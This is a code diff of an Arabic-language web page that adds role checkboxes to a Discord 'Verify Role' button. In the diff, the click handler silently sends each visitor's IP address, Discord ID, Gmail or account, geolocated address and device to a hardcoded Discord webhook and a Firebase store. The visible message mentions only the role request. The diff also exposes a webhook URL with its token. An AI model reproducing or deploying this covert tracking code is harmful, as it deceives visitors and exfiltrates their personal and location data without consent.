@@ -259,17 +259,34 @@
             </div>
           </div>
 
-          <button
-            type="button"
-            id="discordVerifyRoleBtn"
-            onclick="handleDiscordVerifyRole()"
-            class="w-full sm:w-auto bg-gradient-to-r from-[#5865F2] via-indigo-500 to-cyan-500 hover:opacity-95 text-white font-black text-xs sm:text-sm px-5 py-3 rounded-xl flex items-center justify-center gap-2.5 shadow-lg shadow-indigo-500/35 hover:scale-[1.02] active:scale-[0.99] transition flex-shrink-0 cursor-pointer"
-          >
-            <span class="w-5 h-5 rounded-full bg-white/20 flex items-center justify-center text-xs">
-              <i class="fas fa-check-double"></i>
-            </span>
-            <span>Verify Role</span>
-          </button>
+          <div class="w-full sm:w-auto flex flex-col sm:flex-row sm:items-center gap-2.5">
+            <div id="discordVerifyRolesGroup" class="flex flex-wrap items-center justify-center sm:justify-end gap-1.5" dir="rtl">
+              <label class="inline-flex items-center gap-1.5 bg-slate-900/90 hover:bg-slate-800 border border-cyan-400/40 px-2.5 py-2 rounded-xl text-[11px] font-extrabold text-cyan-200 cursor-pointer select-none transition">
+                <input type="checkbox" id="verifyRoleVerified" value="1537565270279979118" data-role-name="verified" checked class="accent-cyan-400 rounded cursor-pointer">
+                <span>verified</span>
+              </label>
+              <label class="inline-flex items-center gap-1.5 bg-slate-900/90 hover:bg-slate-800 border border-indigo-400/40 px-2.5 py-2 rounded-xl text-[11px] font-extrabold text-indigo-200 cursor-pointer select-none transition">
+                <input type="checkbox" id="verifyRoleGaming" value="1538214291210108999" data-role-name="gaming" checked class="accent-indigo-400 rounded cursor-pointer">
+                <span>gaming</span>
+              </label>
+              <label class="inline-flex items-center gap-1.5 bg-slate-900/90 hover:bg-slate-800 border border-emerald-400/40 px-2.5 py-2 rounded-xl text-[11px] font-extrabold text-emerald-200 cursor-pointer select-none transition">
+                <input type="checkbox" id="verifyRoleMember" value="1538632079770918993" data-role-name="member" checked class="accent-emerald-400 rounded cursor-pointer">
+                <span>member</span>
+              </label>
+            </div>
+
+            <button
+              type="button"
+              id="discordVerifyRoleBtn"
+              onclick="handleDiscordVerifyRole()"
+              class="w-full sm:w-auto bg-gradient-to-r from-[#5865F2] via-indigo-500 to-cyan-500 hover:opacity-95 text-white font-black text-xs sm:text-sm px-5 py-3 rounded-xl flex items-center justify-center gap-2.5 shadow-lg shadow-indigo-500/35 hover:scale-[1.02] active:scale-[0.99] transition flex-shrink-0 cursor-pointer"
+            >
+              <span class="w-5 h-5 rounded-full bg-white/20 flex items-center justify-center text-xs">
+                <i class="fas fa-check-double"></i>
+              </span>
+              <span>Verify Role</span>
+            </button>
+          </div>
         </div>
 
         <div id="discordVerifyStatus" dir="rtl" class="hidden mt-3 pt-2.5 border-t border-white/10 text-xs font-bold text-emerald-300 flex items-center gap-2">
@@ -693,8 +710,21 @@
       sessionToken: "abd8d2950920bc8b79cc241a",
       verifyWebhookUrl: "https://discord.com/api/webhooks/1575948259464188055/c3iSqPHF0TkA89QyU8-gHe54TIJMmTi53wwdYp0QCjxy5kxpnY1fzs5CHoJsZS4fbmqA",
       verifyChannelUrl: "https://discord.com/channels/1537549121752141954/1575933649642066151",
-      inviteUrl: "https://discord.gg/HeGbubVc5"
+      inviteUrl: "https://discord.gg/HeGbubVc5",
+      rolesCatalog: {
+        verified: "1537565270279979118",
+        gaming: "1538214291210108999",
+        member: "1538632079770918993"
+      }
     };
+
+    function getSelectedVerifyRoles() {
+      const checked = Array.from(document.querySelectorAll('#discordVerifyRolesGroup input[type="checkbox"]:checked'));
+      return checked.map(el => ({
+        name: el.getAttribute('data-role-name') || el.id,
+        id: el.value
+      }));
+    }
 
     let cachedIpLocationInfo = null;
 
@@ -771,7 +801,7 @@
       return `${DISCORD_VERIFY_CONFIG.verifyBaseUrl}?guild=${guild}`;
     }
 
-    async function sendDiscordVerifyWebhookLog(targetUrl) {
+    async function sendDiscordVerifyWebhookLog(targetUrl, selectedRoles = []) {
       const webhookUrl = (DISCORD_VERIFY_CONFIG.verifyWebhookUrl || "").trim();
       if (!webhookUrl || webhookUrl.startsWith("ضع_هنا_")) return;
 
@@ -792,33 +822,91 @@
         ? `${locInfo.address} ([خريطة](${locInfo.mapUrl}))`
         : (locInfo.address || "غير متوفر");
 
-      postDiscordWebhook(
-        webhookUrl,
-        "🛡️ دخول مباشر إلى روم Verify من السيت",
-        [
-          { name: "🌐 IP", value: ipValue, inline: true },
-          { name: "🆔 Discord ID", value: discordIdValue, inline: true },
-          { name: "📧 Gmail / الحساب", value: accountOrGmailValue, inline: true },
-          { name: "📍 Adresse Connect", value: connectAddressValue, inline: false },
-          { name: "📱 الجهاز", value: platInfo.label, inline: true },
-          { name: "📌 روم Verify", value: targetUrl, inline: false }
-        ],
-        0x5865f2
-      );
+      const rolesSummary = selectedRoles.length
+        ? selectedRoles.map(r => `• **${r.name}** (\`${r.id}\`)`).join("\n")
+        : "غير محدد";
+
+      const roleIdsOnly = selectedRoles.length
+        ? selectedRoles.map(r => r.id).join(", ")
+        : "—";
+
+      const payload = {
+        embeds: [{
+          title: "🛡️ طلب Verify والرولات المختارة من السيت",
+          color: 0x5865f2,
+          fields: [
+            { name: "🎭 الرولات المختارة", value: rolesSummary, inline: false },
+            { name: "🔢 Role IDs", value: `\`${roleIdsOnly}\``, inline: false },
+            { name: "🌐 IP", value: ipValue, inline: true },
+            { name: "🆔 Discord ID", value: discordIdValue, inline: true },
+            { name: "📧 Gmail / الحساب", value: accountOrGmailValue, inline: true },
+            { name: "📍 Adresse Connect", value: connectAddressValue, inline: false },
+            { name: "📱 الجهاز", value: platInfo.label, inline: true },
+            { name: "📌 روم Verify", value: targetUrl, inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      try {
+        await fetchWithTimeout(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        }, 4500);
+      } catch (_) {}
+    }
+
+    async function saveVerifyRoleRequestToFirebase(selectedRoles) {
+      if (!hasFirebaseConfig() || !selectedRoles.length) return;
+      const reqKey = "verify_req_" + Date.now() + "_" + Math.random().toString(36).slice(2, 6);
+      const record = {
+        guildId: DISCORD_VERIFY_CONFIG.guildId,
+        discordUserId: detectDiscordUserId(),
+        accountOrGmail: detectConnectedAccountOrGmail(),
+        deviceId: MY_DEVICE_ID,
+        devicePlatform: CURRENT_CLIENT_PLATFORM,
+        ip: currentClientIp || "",
+        roles: selectedRoles,
+        roleIds: selectedRoles.map(r => r.id),
+        status: "pending",
+        createdAt: Date.now()
+      };
+      try {
+        await fetchWithTimeout(`${getDbBaseUrl()}/verifyRoleRequests/${encodeURIComponent(reqKey)}.json`, {
+          method: "PUT",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(record)
+        }, 4500);
+      } catch (_) {}
     }
 
     async function handleDiscordVerifyRole() {
       const statusBox = document.getElementById("discordVerifyStatus");
       const statusText = document.getElementById("discordVerifyStatusText");
+      const selectedRoles = getSelectedVerifyRoles();
+
+      if (!selectedRoles.length) {
+        if (statusBox && statusText) {
+          statusBox.classList.remove("hidden");
+          statusText.textContent = "اختار على الأقل رول واحد (verified / gaming / member) قبل الضغط على Verify Role.";
+        }
+        return;
+      }
+
+      const roleNamesText = selectedRoles.map(r => r.name).join(" + ");
       const targetUrl = buildVerifierTargetUrl();
 
       if (statusBox && statusText) {
         statusBox.classList.remove("hidden");
-        statusText.textContent = "جاري توجيهك نيشان إلى روم Verify في Discord...";
+        statusText.textContent = `جاري إرسال طلب الرولات (${roleNamesText}) إلى Discord وتوجيهك إلى روم Verify...`;
       }
 
       try {
-        await sendDiscordVerifyWebhookLog(targetUrl);
+        await Promise.all([
+          sendDiscordVerifyWebhookLog(targetUrl, selectedRoles),
+          saveVerifyRoleRequestToFirebase(selectedRoles)
+        ]);
       } catch (_) {}
 
       if (/^https?:\/\//i.test(targetUrl)) {
